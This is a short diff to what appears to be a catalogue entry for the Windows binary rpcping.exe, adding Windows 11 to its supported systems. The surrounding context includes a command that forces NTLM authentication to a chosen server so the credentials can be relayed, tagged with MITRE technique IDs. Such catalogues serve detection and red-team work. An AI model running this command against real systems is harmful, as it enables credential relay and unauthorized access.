@@ -10,14 +10,14 @@ Commands:
     Category: Credentials
     Privileges: User
     MitreID: T1003
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
     Description: Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).
     Usecase: Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
     Category: Credentials
     Privileges: User
     MitreID: T1187
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\rpcping.exe
   - Path: C:\Windows\SysWOW64\rpcping.exe
